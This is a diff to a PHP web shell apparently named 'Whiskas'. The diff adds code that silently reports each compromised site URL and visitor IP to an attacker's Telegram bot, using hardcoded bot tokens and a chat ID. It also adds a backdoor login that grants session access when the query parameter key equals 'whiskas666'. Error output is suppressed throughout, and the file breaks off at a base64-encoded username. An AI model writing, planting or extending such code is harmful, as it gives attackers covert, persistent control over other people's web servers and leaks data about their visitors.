@@ -2,26 +2,44 @@
 error_reporting(0);
 ini_set('display_errors', 0);
 
-$botToken = "8652693265:AAHJUv9t9FlAPS3ZsqRNUIfZ0ut5h6grP_U";
+$botToken = "8652693265:AAFtpb8DO7bksGLFQlitbvPwvCLb-KQ8rN0";
 $chatId   = "8740437616";
+$url_hash = md5($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "v1");
 
-$domain   = $_SERVER['HTTP_HOST'];
-$path     = $_SERVER['REQUEST_URI'];
-$ip_addr  = $_SERVER['REMOTE_ADDR']; 
-$full_url = "http://" . $domain . $path;
+if (!isset($_COOKIE['sent_' . $url_hash])) {
+    $domain   = $_SERVER['HTTP_HOST'];
+    $path     = $_SERVER['REQUEST_URI'];
+    $full_url = (isset($_SERVER['HTTPS']) ? "https://" : "http://") . $domain . $path;
 
-$message  = "📢 **Shell Akses Terdeteksi!**\n";
-$message .= "🌐 URL: " . $full_url . "\n";
-$message .= "📍 IP Pengakses: " . $ip_addr . "\n";
-$message .= "⏰ Waktu: " . date("Y-m-d H:i:s");
+    $message  = "📢 **Whiskas finds access**\n";
+    $message .= "🌐 *URL:* " . $full_url . "\n";
+    $message .= "📍 *IP:* " . $_SERVER['REMOTE_ADDR'] . "\n";
+    $message .= "⏰ *Waktu:* " . date("Y-m-d H:i:s");
 
+    $url = "https://api.telegram.org/bot$botToken/sendMessage";
+    $post_fields = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'Markdown'];
 
-$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message) . "&parse_mode=Markdown";
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    @curl_exec($ch);
+    curl_close($ch);
 
-@file_get_contents($url);
+    setcookie('sent_' . $url_hash, 'true', time() + 86400, '/');
+}
 
-
-echo "System Berjalan Normal.";
+if (isset($_GET['key']) && $_GET['key'] === 'whiskas666') {
+    @session_start();
+    $_SESSION['auth'] = true;
+    
+    $actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+    $clean_url = explode('?', $actual_link)[0];
+    header("Location: $clean_url");
+    exit;
+}
 
 $GLOBALS['WHISKAS'] = array(
     'username' => base64_decode('d2hz'), 
